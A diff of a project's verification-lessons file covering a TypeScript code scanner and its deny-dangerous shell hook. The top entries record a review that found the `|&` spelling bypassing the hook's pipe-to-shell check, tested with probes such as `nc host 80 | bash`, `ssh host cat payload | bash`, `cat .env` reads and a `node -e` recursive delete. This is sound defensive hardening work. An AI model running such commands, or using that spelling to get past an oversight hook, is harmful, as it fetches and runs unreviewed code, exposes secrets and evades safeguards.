@@ -1,40 +1,33 @@
 ---
 category: verification
-last_reviewed: 2026-06-10
+last_reviewed: 2026-08-13
 ---
 
 # Verification lessons
 
-## Lesson: self-scan new CLI fixtures before settling their test file
+## Lesson: the always-permitted equivalent must match the guard's threat model, not the easiest producer
 
-**Created:** 2026-06-03
+**Created:** 2026-08-13
 
-**What happened:** During the `security.new-function` config regression, the first CLI test landed in
-`src/cli.test.ts`, pushing that already-near-threshold file over `size.file-length`. Moving it to
-`src/security-and-config.test.ts` cleared file length, but the changed-range self-scan then exposed
-`security.process-exec` from a dynamic `execFileSync(join(REPO_ROOT, "bin/gruff-ts"), ...)` command
-and `docs.fixture-purpose-missing` because the purpose comment was inside the test body instead of
-leading the test declaration.
+**Decision changed:** When the equivalence test clears a guard gap, re-run it with a producer the guard actually exists to stop before recording the gap as harmless.
 
-**Evidence:** `src/security-and-config.test.ts` (search: `CLI severity override keeps new Function below fail-on error`);
-`src/fixture-purpose-rules.ts` (search: `function hasFixturePurposeComment`); `src/line-rules.ts`
-(search: `function isFixedArgvProcessCallSegment`).
+**Trigger phase:** VERIFY
 
-**Prevention:** Before closing a new CLI regression, run a changed-range gruff scan on the touched
-test file. Put fixture-purpose comments directly above the `test(...)` declaration, prefer block
-comments when multiple marker words matter, and use fixed literal command vectors such as
-`execFileSync("bash", [join(REPO_ROOT, "bin/gruff-ts"), ...])` instead of making the executable path
-itself dynamic.
+**What happened:** Reviewing the same 0.5.0 hook work, I found that `|&` was invisible to the pipeline consumer checks, because splitting on `|` leaves the next stage reading as `& bash`. I applied the equivalence test from the lesson below using `cat file |& bash`, saw that `bash file` is permitted anyway, and downgraded the gap to a non-blocking pre-existing pointer. That producer was the benign one.
 
-## Lesson: positive scanner fixtures and repo self-scan do not prove false-positive safety
+**Evidence:** re-running the same probe with the producers the rule targets reversed the conclusion: `nc host 80 | bash`, `gh api /repos/o/r | bash`, and `ssh host cat payload | bash` are all BLOCKED, while the `|&` spelling of each was ALLOWED at base and at head. The permitted equivalent for those is `producer > file` then `bash file`, which is a different capability, because the policy accepts it precisely for leaving an inspectable artifact behind.
 
-**Created:** 2026-06-03
+**Prevention:** the equivalence test asks whether the capability already existed, so the producer has to carry the property the guard cares about. For pipe-to-shell that is unreviewed bytes, not any bytes. Pick the producer from the block message ("Download or inspect first"), and when a guard has both a benign and a hostile producer class, test the hostile one before concluding no capability was gained.
 
-**What happened:** The first close-out for `test-quality.static-analysis-redundant-test` had `npm run check` green and a repo self-scan with zero hits, but an independent QA pass built a minimal runtime-callable repro and found high-confidence false positives on `assert.equal(typeof handler, "function")` where `handler` came from a factory, and `plugin.activate` came from a loaded plugin. The implementation's positive fixtures proved the rule fired on shape-only assertions, but they did not prove the rule stayed quiet on the highest-traffic behavioral form of the same assertion syntax.
+## Lesson: a relaxed guard is only a regression when the equivalent direct command was blocked
 
-**Evidence:** `src/static-analysis-redundant-rules.ts` (search: `function typeofFunctionAssertions`) accepted any identifier/member operand as static evidence; `src/test-block-rules.test.ts` (search: `keeps runtime callable typeof assertions quiet`) is the regression shape that should have existed before close-out; the failing throwaway scan reported two `test-quality.static-analysis-redundant-test` findings for factory/plugin callable assertions before the guard was added.
+**Created:** 2026-08-13
 
-**Prevention:** For every new scanner rule, add at least one adversarial false-positive fixture that uses the same syntax as the intended hit but with behavior-bearing data flow. A repo self-scan returning zero findings is not enough when the repo no longer contains the risky syntax class; build a throwaway repro for the candidate class the rule is meant to police.
+**What happened:** Reviewing the 0.5.0 hook changes, I reported that the new local-producer exemption in `.goat-flow/hooks/deny-dangerous/patterns-shell.sh` (search: `interpreter_treats_stdin_as_data`) allowed arbitrary destructive inline interpreter code, and I graded it a blocking security regression. The evidence looked decisive: `printf x | node -e 'require("fs").rmSync("dist",{recursive:true})'` was BLOCKED at the base commit and ALLOWED at head, reproduced at runtime on both. An automated reviewer had independently flagged the same exemption, which reinforced the reading.
+
+**Evidence:** the base-versus-head comparison was real but incomplete. Running the same body without the pipe showed `node -e 'require("fs").rmSync("dist",{recursive:true})'` ALLOWED at base as well as head. The base only blocked the piped spelling through a blanket pipe-to-interpreter rule; it never inspected the body. Since anything reachable via `printf x | node -e 'BODY'` was already reachable via `node -e 'BODY'`, the change granted no new capability. The residual exposure is the project's documented accepted scope limit, stated in the suite itself (search: `ACCEPTED scope: python3 shell escape in body is not inspected`).
+
+**Rule going forward:** a base-to-head behaviour delta is necessary but not sufficient for a regression claim. Before grading one, run the nearest always-permitted equivalent of the same capability. If that equivalent was already allowed, the guard being removed was incidental rather than load-bearing, and the finding is an accepted-scope pointer, not a blocker. Applies equally to bot findings: the same check refuted the automated report. The sibling finding in that review survived this test precisely because `cat .env` is blocked, so `find .env -exec cat {} \;` had no permitted equivalent.
 
 ## Lesson: converting the dogfood config to a profile breaks rule-enumeration contract tests
 
@@ -92,9 +85,17 @@ itself dynamic.
 
 **What happened:** A first self-scan cleanup added leading comments and removed most findings, but the follow-up scan still reported context-doc gaps because the comments did not include the rule's expected contract, throws, or side-effect vocabulary.
 
-**Evidence:** `src/changed-regions.ts` + `(search: "function parseChangedRanges")` and `(search: "function gitOutput")`; `src/test-fixtures.ts` + `(search: "function analyseProject")`; `src/baseline-and-project.test.ts` + `(search: "function evalFindingLines")`.
+**Recurrence, 2026-07-12:** New quoted-hash scanner tests used useful fixture-purpose comments but omitted `stable` or `contract` from the final line. The focused suite and full check passed, then the self-scan reported both test callbacks under `docs.missing-invariant-doc` until the final comment lines named the stable contract. A later redirect fixture made the inverse mistake: `Fixture purpose` appeared on the first line and `Stable contract` on the final line, so `docs.fixture-purpose-missing` fired. The final line must carry every applicable vocabulary, such as `Stable fixture contract`.
 
-**Prevention:** When adding comments to clear self-scan documentation findings, include the relevant marker word in the declaration's leading comment (`contract`/`stable`, `throws`, `spawns`, `filesystem`, etc.) and rerun the full self-scan before close-out.
+**Redaction-policy recurrence, 2026-07-12:** The focused suites and full 389-test gate passed, but self-scan found four comment-contract gaps: a rewritten baseline helper omitted its temp-file write, the complex preview test's final comment line omitted why the boundary exists, and two named display limits lacked nearby threshold rationale. The first fix reduced the scan to one finding because the baseline helper still omitted invariant vocabulary; the final line now combines `Stable contract` with the fixture-directory write. The other fixes put `because` on the fixture contract's final line and explain both limits beside their declarations.
+
+**History-scope recurrence, 2026-07-12:** The focused suites and full 392-test gate passed, but self-scan reported all three new CLI test callbacks for missing side-effect documentation. Their final fixture comments named the stable user contract but not the subprocess action; adding `spawns` to each final line made the real CLI execution explicit.
+
+**Complexity-metric recurrence, 2026-07-12:** The focused suites and full 404-test gate passed, then self-scan reported 16 comment-context findings. Large test callbacks needed `Stable fixture contract` on their final leading line, while the fixed metadata key `catch` made the new metric helpers look error-bearing until their comments said they report deterministically or never throw. The same scan caught `src/blocks.ts` six lines over budget; concise comments brought it to 749 without moving behavior.
+
+**Evidence:** `src/changed-regions.ts` + `(search: "function parseChangedRanges")` and `(search: "function gitOutput")`; `src/test-fixtures.ts` + `(search: "function analyseProject")`; `src/baseline-and-project.test.ts` + `(search: "function assertBaselineRoundTrip")`; `src/sensitive-data-rules.test.ts` + `(search: "short masks stay opaque because")`; `src/sensitive-data-rules.ts` + `(search: "24-character threshold")`; `src/security-flow-rules.test.ts` + `(search: "Stable fixture contract")`; `src/history-scope.test.ts` + `(search: "spawns filtered commands")`; `src/complexity-metrics.test.ts` + `(search: "Stable fixture contract")`; `src/complexity-metrics.ts` + `(search: "It reports one deterministic breakdown")`.
+
+**Prevention:** When adding comments to clear self-scan documentation findings, include the relevant marker word in the declaration's leading comment (`contract`/`stable`, `throws`, `spawns`, `filesystem`, etc.). For stacked `//` comments, put every applicable vocabulary on the final line, then rerun the full self-scan before close-out.
 
 ## Lesson: broadening scope can invalidate old suppression-count assertions
 
@@ -146,6 +147,11 @@ itself dynamic.
 **Prevention:** When fixing documentation findings in bulk, verify both rule counts and comment quality. Grep for repeated scaffolding phrases before presenting the change, and sample the largest edited file for comments that merely satisfy the predicate.
 
 **Follow-up:** A later cleanup made comments more readable but removed words such as `stable`, `deterministic`, `fingerprint`, `throws`, and `reports` that encode the analyzer's own context-doc contracts. Before closing a comment rewrite, rerun the self-scan and compare context-doc rules as well as the originally targeted missing-doc rules.
+
+**Parse-summary recurrence, 2026-08-11:** Renaming the per-file parser diagnostic helper to
+`summarizeParseErrors` made its purpose clearer, but its first comment revision described only the
+returned report entry. “Reported” and “do not throw” still missed the rule's canonical vocabulary;
+the self-scan cleared when the return contract used `reports`: “reports parser errors without throwing.”
 
 ## Lesson: verify extracted modules for circular self-scan edges
 
@@ -227,16 +233,6 @@ itself dynamic.
 
 **Prevention:** Any benchmark or report label that can contain `/`, spaces, or option-like prefixes must be converted to a filesystem slug before it is used as a path segment. Keep human labels in JSON/report fields; use sanitized names only for temp files.
 
-## Lesson: source-scanning contract tests must follow refactors across helper contexts
-
-**Created:** 2026-05-17
-
-**What happened:** During self-scan cleanup, `npm run check` failed after threshold-backed rules were refactored to read thresholds through `context.config` instead of a direct `config` parameter. The analyzer behavior was intact, but the descriptor/config threshold contract test only searched for `threshold(config, ...)`, so it undercounted implemented thresholds until the regex was widened.
-
-**Evidence:** `src/cli.test.ts` + `(search: "function thresholdUsages")`; the failing run reported missing implementation thresholds for `size.function-length`, `size.parameter-count`, `complexity.cyclomatic`, `complexity.cognitive`, and `complexity.npath`.
-
-**Prevention:** When a contract test scans source text instead of calling a structured API, update its extractor in the same refactor that changes call shape. Prefer matching the semantic argument form, such as optional context prefixes, over one local variable spelling.
-
 ## Lesson: keep verification wrappers visible to the deny hook
 
 **Created:** 2026-05-16
@@ -292,27 +288,19 @@ when the old behavior is still present in code.
 
 `src/cli.ts` is the entire runtime. It compiles under `strict + noUncheckedIndexedAccess + exactOptionalPropertyTypes`, which means a small change (e.g., adding a property to `Finding` without making it optional, or indexing an array without a bounds check) routinely breaks `tsc` even when the diff "looks fine". `npm run check` runs `tsc --noEmit && npm test` - both are needed, both are fast (sub-second `tsc`, ~150ms test). Pasting the literal "0 fail" line from the test runner is the verification artifact; "looks correct" is not.
 
-## Lesson: when changing rule output, regenerate the baseline test scenario, do not edit findings inline
+## Lesson: classify interpreter pipelines by whether stdin is data or code
 
 **Created:** 2026-05-10
+**Updated:** 2026-08-09
+**Decision changed:** Check the current hook's stdin classification before rewriting a local-data pipeline; downloader and executable-stdin paths remain blocked, while reviewed local data consumers may be allowed.
 
-`src/cli.test.ts` writes a fixture and asserts that specific `ruleId`s appear (`security.eval-call`, `size.parameter-count`, `test-quality.no-assertions`, `modernisation.public-property`). If you alter a rule's `ruleId`, threshold, or matcher, the fixture text - not the assertion list - is the part to expand: add a new bad pattern that triggers the renamed rule. Editing the assertion to "make the test pass" with the existing fixture defeats the test's purpose (proving the rule fires at all).
+The pre-1.14 policy blocked every pipe into `python3 -c` or `node -e`, so local-data processing had to switch to a file intermediate. Goat-flow 1.14 now distinguishes reviewed local producers feeding an inline snippet or checked-in script (stdin remains data) from raw interpreter stdin, stdin-path/module spellings, and downloader pipelines (stdin may execute code).
 
-## Lesson: the deny-dangerous hook treats piping into `python3 -c`/`node -e` as blocked
+**Recurrence, 2026-08-09:** M28 put literal backticks inside a double-quoted `rg` pattern; the deny hook blocked it before execution.
 
-**Created:** 2026-05-10
+**Evidence:** `.goat-flow/hooks/deny-dangerous/patterns-shell.sh` (search: `interpreter_treats_stdin_as_data`) owns the current classification; `.goat-flow/hooks/deny-dangerous/deny-dangerous-self-test.sh` (search: `Local data may be piped into explicit inline interpreter snippets`) pins allowed local-data cases and blocked executable-input cases.
 
-`.goat-flow/hooks/deny-dangerous.sh` blocks "pipe to interpreter" patterns. When summarising audit JSON or processing tool output with a one-liner, write to `/tmp/<file>.json` first and then run the interpreter against the file path. Trying to retry the same pipeline after a block triggers the same hook - the lesson is to switch to a file-based intermediate, not to keep retrying.
-
-## Lesson: threshold fixtures must exceed the threshold they are proving
-
-**Created:** 2026-05-13
-
-**What happened:** The first high-entropy sensitive-data fixture initially used a 31-character secret-like value while the rule default required 32 characters, so the targeted test failed after implementation until the fixture value was corrected.
-
-**Evidence:** `src/cli.test.ts` + `(search: "const secret =")` - the first-slice fixture owns the candidate value for `sensitive-data.high-entropy-string`.
-
-**Prevention:** When adding threshold-backed rule fixtures, count or otherwise prove the fixture value crosses the threshold before treating a missing finding as an implementation bug.
+**Prevention:** If the hook blocks a pipeline, do not retry an equivalent spelling. Inspect whether stdin is code or data; keep downloader and raw-stdin execution blocked, and use an explicit file input when the command falls outside the reviewed local-data cases. Use single-quoted search patterns when repository text contains backticks.
 
 ## Lesson: self-analysis smoke catches scanner regressions that fixtures miss
 
@@ -320,9 +308,13 @@ when the old behavior is still present in code.
 
 **What happened:** Core-expansion unit fixtures passed, but `./bin/gruff-ts analyse src --format=json --fail-on=none --no-config` exposed a `parse-error` in `src/cli.ts` and false positives where control statements were treated as function blocks.
 
-**Evidence:** `src/cli.ts` + `(search: "function parseDiagnostics")` and `(search: "function functionBlocks")`; `src/cli.test.ts` now includes clean control-flow coverage and delimiter-looking literal coverage.
+**Markdown-renderer recurrence, 2026-07-12:** The focused Markdown suite and the full 395-test gate passed, but the zero-tolerance self-scan reported 12 advisories. One inline type import needed the repository's split type-import style; ten cascading unused/empty-function findings came from a nested template literal inside another template's interpolation confusing `maskNonCode`; and the final finding required explicit invariant vocabulary on the complexity grouping helper. Precomputing the inner label and rerunning the original scan cleared the cascade, then the concise `Invariant:` comment cleared the last finding.
 
-**Prevention:** For regex-heavy rule work, run the analyzer against `src` before declaring the work done, and check the output for diagnostics plus impossible symbols such as `if`, `switch`, or `catch`.
+**Release-truth recurrence, 2026-07-12:** The full 420-test gate passed, but the self-scan found three missing-context advisories in a new determinism test. A block comment fixed the invariant, while `Side effect:` still failed because that label is not in the rule's accepted vocabulary. Naming the concrete `writes` and `filesystem` behavior cleared the final finding. The exact self-scan, not TypeScript or unit tests, proved the comments met gruff's user-facing contract.
+
+**Evidence:** `src/cli.ts` + `(search: "function parseDiagnostics")` and `(search: "function functionBlocks")`; `src/cli.test.ts` now includes clean control-flow coverage and delimiter-looking literal coverage; `src/report-renderers.ts` (search: `function renderMarkdownComplexityClusterRow`) is the flattened renderer shape; `.goat-flow/learning-loop/footguns/rule-scanners.md` (search: `nested template interpolation`) records the masking limit.
+
+**Prevention:** For regex-heavy or renderer work, run the analyzer against the final tree before declaring the work done. Treat a sudden run of impossible empty functions or unused parameters after a template expression as a masking signal, flatten the source shape, and rerun the exact scan rather than adding suppressive comments to every downstream symptom.
 
 ## Lesson: inspect smoke output, not just exit status
 
@@ -344,112 +336,26 @@ when the old behavior is still present in code.
 
 **Prevention:** Run determinism checks by themselves, or generate any scratchpad/baseline artifacts before the first compared run. Parallel verification is fine only when none of the commands write into paths being scanned.
 
-## Lesson: anchor repetitive fixture patches before trusting cumulative coverage
+## Lesson: re-verify external defect reports against HEAD before fixing
 
-**Created:** 2026-05-14
+**Created:** 2026-08-04
 
-**What happened:** The cumulative rule-coverage test initially missed `test-quality.no-throw-only-test` because a patch matched the first `test("global mutation"` block in `src/cli.test.ts`, not the later cumulative fixture block that owns `expandedRuleIds`.
+**What happened:** A detailed false-positive report written against gruff-ts 0.4.0 arrived after 0.5.0 had landed. Rebuilding every reproduction as a scratchpad project and scanning it with HEAD showed two of six items already fixed (comment-style coupling via combinedContextLineComment; the docs-versus-size interaction via substantive line counting), and one claimed workaround (extracting an inline payload to a named const) no longer cleared the finding at HEAD. Fixing from the report's text alone would have produced no-op "fixes" and a wrong changelog.
 
-**Evidence:** `src/cli.test.ts` + `(search: "cumulative expanded fixture covers every new rule with unique fingerprints")`; the failing run of `node --import tsx --test src/cli.test.ts` reported `expected test-quality.no-throw-only-test`.
+**Evidence:** scratchpad repro scans - orig/extracted/stacked d1 variants all fired `docs.fixture-purpose-missing` at HEAD while the report said extraction cleared it at 0.4.0; d3 JSDoc and `//` variants produced identical finding sets at HEAD.
 
-**Prevention:** When a fixture label appears more than once, patch or inspect around the owning test name first, then verify the new rule id appears in the cumulative fixture before rerunning the full gate.
+**Prevention:** Turn each reported reproduction into a runnable fixture and scan it with the current build FIRST; classify each item as reproduces / already-fixed / diverged, and only then write red tests for the ones that reproduce. Say so explicitly when a repro does not fail rather than "fixing" it.
 
-## Lesson: rule-catalogue coverage fixtures must match scanner limits
+**Recurrence, 2026-08-05:** The same external report gained two new items (composite scoring, stale-param paren types) after the first remediation pass shipped. Re-running the repros against HEAD split them cleanly: the stale-param defect no longer reproduced (fixed structurally by the 0.5.0 shared AST parameter discovery, pinned with both-direction tests), while the composite defect reproduced exactly as measured and was fixed (ADR-019). Treat an amended report as a fresh report: re-verify every new item before touching code.
 
-**Created:** 2026-05-14
+**Recurrence, 2026-08-05 (vocabulary plurals):** context-doc vocabulary is matched with word boundaries, so plural forms fail: a comment saying "keeps fingerprints unique" does not satisfy `\bfingerprint\b` and `docs.missing-invariant-doc` fired on the new scoring test helper until the comment said "each fingerprint". When writing marker vocabulary, use the singular form the regex lists.
 
-**What happened:** The descriptor self-test first failed for `design.god-function` because the catalogue fixture was not long and complex enough, then failed for `test-quality.magic-number-assertion` because the fixture used `expect(renderCatalogue().length).toBe(42)`, which exceeded the regex assertion matcher’s supported shape.
+## Lesson: prove a gate fails in every direction it claims to cover
 
-**Evidence:** `src/cli.test.ts` + `(search: "rule descriptors cover emitted rules and fixture-backed coverage")`; failing runs of `node --import tsx --test src/cli.test.ts` reported missing positive fixture coverage for those rule ids.
+**Created:** 2026-08-16
 
-**Prevention:** For catalogue coverage, make each fixture intentionally boring and shaped exactly like the scanner pattern: simple variables for assertion arguments, deliberately long blocks for composite size/complexity rules, and no accidental symbol references that mask unused-import coverage.
+**What happened:** `src/release-truth.test.ts` claimed in both its own `Invariant:` comment and `footguns/schema-and-cli.md` that "adding or removing an extension in `pushSourceFile` fails one of these two counts". It was verified load-bearing by re-adding `"css"` and watching the test fail. That proof only covered one direction. `css` was already in `UNSCANNED_FIXTURE_FILES`, so re-adding it moved a count; a genuinely new extension moved neither. A PR review reported the gap and it reproduced: appending `"properties"` to the text allowlist left `npm run check` green at `# pass 3 # fail 0`.
 
-## Lesson: restart browser-visible servers after source edits
+**Evidence:** Pre-fix tree with `"properties"` added - `# pass 3 # fail 0`. Post-fix same edit - `not ok 2 - discovery allowlist matches the documented scan surface`.
 
-**Created:** 2026-05-15
-
-**What happened:** During dashboard parity verification, screenshots were first captured against a dashboard server that had been started before the final `src/cli.ts` CSS tweak. The evidence was structurally valid, but it did not prove the current source until the server was stopped, restarted, and the captures were rerun.
-
-**Evidence:** `src/cli.ts` + `(search: "function startDashboard")`; the dashboard-parity capture script in `.goat-flow/scratchpad/dashboard-parity/` captured the current-source screenshots only after the dashboard was restarted on `127.0.0.1:8877`.
-
-**Prevention:** For browser-visible code, restart any long-running dev server after every source edit before taking final screenshots or claiming visual verification.
-
-## Lesson: wait for post-interaction UI state, not just selectors
-
-**Created:** 2026-05-15
-
-**What happened:** The dashboard-parity screenshot script initially clicked dashboard Refresh and then read `[data-scan-status]` before the iframe `load` handler had settled, producing a false failure with status `Scanning`.
-
-**Evidence:** The capture script under `.goat-flow/scratchpad/dashboard-parity/` (search: `wait_for_function`); the corrected script waits until the status text is `Ready` before asserting refresh completion.
-
-**Prevention:** Browser evidence scripts should wait for the user-visible postcondition after an interaction, not only for a reused selector or iframe to exist.
-
-## Lesson: update positive fixtures when raising rule thresholds
-
-**Created:** 2026-05-15
-
-**What happened:** The `test-quality.setup-bloat` default moved from 8 to 12 setup lines, but two positive fixtures still used only nine setup statements. `npm run check` correctly failed until the fixtures were expanded past the new threshold.
-
-**Evidence:** `src/cli.test.ts` + `(search: "test(\"setup bloat\"")`; failing test names were `risk expansion finds scoped test-quality rules` and `cumulative expanded fixture covers every new rule with unique fingerprints`.
-
-**Prevention:** When changing a default threshold, update every positive fixture owned by that rule in the same patch and count the candidate lines against the new default before rerunning the full gate.
-
-## Lesson: verification commands must account for local artifact directories
-
-**Created:** 2026-05-16
-
-**What happened:** During the related-projects intake work, the clone inventory command originally listed every directory under `.goat-flow/scratchpad/related-projects`, but the task itself created `.goat-flow/scratchpad/related-projects/study`, so the command no longer proved "exactly the ten cloned projects" after the first artifact write.
-
-**Evidence:** The verified command now excludes `study`; commands that grep ignored `.goat-flow` artifacts use `rg -uuu`.
-
-**Prevention:** When a task writes verification artifacts inside the tree being enumerated, either exclude the artifact directory in the proof command or write artifacts outside the enumerated scope. Use `rg -uuu` for checks that intentionally inspect gitignored `.goat-flow/plans` or `.goat-flow/scratchpad` files.
-
-## Lesson: widen typed test maps when one list has documented exceptions
-
-**Created:** 2026-05-16
-
-**What happened:** During rule-quality doctrine work, the first `npm run check` failed in `tsc` because a rule-quality self-check built one `Map` from doctrine entries and another from exception entries. TypeScript inferred each `Map` with only its literal key union, so looking up the full risky-rule union failed for the exception-only rule.
-
-**Evidence:** `src/cli.test.ts` + `(search: "rule quality doctrine covers risky scanner descriptors")`; the failing command reported `sensitive-data.api-key-pattern` was not assignable to the doctrine-only map key union.
-
-**Prevention:** For test metadata split across coverage and exception lists, widen lookup maps to `Map<string, ...>` before iterating the combined rule-id list. This preserves useful literal data in the source arrays while keeping strict TypeScript from rejecting intentional exception-only entries.
-
-## Lesson: keep fixture strings compact when fixing self-scan import noise
-
-**Created:** 2026-05-21
-
-**What happened:** While clearing an unused-import self-scan finding, expanding a template fixture into an array of string lines made the surrounding test exceed `test-quality.setup-bloat` and re-triggered `docs.fixture-purpose-missing`.
-
-**Evidence:** `src/docs-comment-rules.test.ts` + `(search: "comment quality requires rationale for non-TypeScript suppressions")`; the corrected fixture uses one concatenated source expression so `TS_IGNORE_DIRECTIVE` is visible to import analysis without adding setup lines.
-
-**Prevention:** When a fixture token must be visible outside a template literal, prefer a compact concatenated expression over line-array builders unless the test already has setup budget and a nearby fixture-purpose comment.
-
-## Lesson: self-scan CLI onboarding changes before close-out
-
-**Created:** 2026-05-24
-
-**What happened:** During baseline-onboarding work, `npm run check` passed but `./bin/gruff-ts summary . --fail-on=none --no-baseline` exposed new gruff findings from newly added helper functions and a CLI test that used a dynamic binary path for `execFileSync`.
-
-**Evidence:** `src/report-renderers.ts` + `(search: "function summaryBaselineLine")`; `src/cli-surfaces.test.ts` + `(search: "summary CLI reports generated and applied baseline metadata")` - the corrected version documents the baseline summary contract and uses the fixed local `./bin/gruff-ts` command vector.
-
-**Prevention:** For scanner-facing CLI or renderer changes, run a self-scan after the normal test gate, then remove avoidable new findings before closing. In CLI tests, prefer fixed local command vectors when possible so process-exec findings remain focused on dynamic commands.
-
-## Lesson: baseline smoke tests must keep project root stable
-
-**Created:** 2026-05-24
-
-**What happened:** A manual baseline smoke generated `gruff-baseline.json` from the repository cwd against an absolute `/tmp/.../sample.ts`, then tried to auto-apply it from the temp project cwd. Default baseline application appeared to fail because the finding `filePath` identity changed from a repo-relative temp path to `sample.ts`.
-
-**Evidence:** `src/baseline.ts` + `(search: "function applyBaseline")`; `src/analyser.ts` + `(search: "function selectedBaseline")` - baseline matching includes `(fingerprint, ruleId, filePath)`, and default baseline discovery is rooted at the current project root.
-
-**Prevention:** Generate and apply baseline smoke artifacts from the same project root. If testing absolute path operands, assert that changed display paths intentionally do not match the baseline.
-
-## Lesson: ground-truth a throwaway when a test result looks impossible (or the harness drops its output)
-
-**Status:** active | **Created:** 2026-06-01 | **Evidence:** OBSERVED (M25 AST-flow slice)
-
-During the M25 AST-flow slice, `npm test` reported five failing security-flow tests whose failures were logically impossible from reading the code (a negative case with no sink "firing" a filesystem finding). Two compounding causes: (1) a real bug - an AST cache keyed by `SourceFile` identity returned the first test's parse for every later test that reused the shared `fileStub` (see the footgun "caching a parsed AST by SourceFile identity ..."); (2) the tool channel was intermittently dropping or lagging command output, so TAP summaries arrived stale or not at all.
-
-What worked: a tiny throwaway script under `/tmp` that imported the rule function and printed the actual findings per input. Its byte-identical output across six different inputs pinpointed the stale-cache bug at once - something the laggy TAP stream never made clear.
-
-Takeaways: (1) when a test result contradicts a careful read of the code, get ground truth by printing actual values from a minimal harness before "fixing" the rule - the cause is often shared or aliased state, not the logic. (2) Do not thrash re-issuing the same command when the output channel is dropping results; one clean ground-truth probe beats ten dropped re-runs. (3) The root cause was an unrequested cache abstraction - prefer the simplest thing that works (CLAUDE.md: "No new abstractions ... beyond what was asked").
+**Prevention:** When a gate claims to cover N directions, run N experiments, one per direction, and pick each probe so it is NOT already named in the fixture data - a probe drawn from the fixture set proves only that the fixture set is wired up. More generally, a behavioural assertion over an enumerated fixture set gates the fixtures, not the enumeration: to gate a list, assert the list.
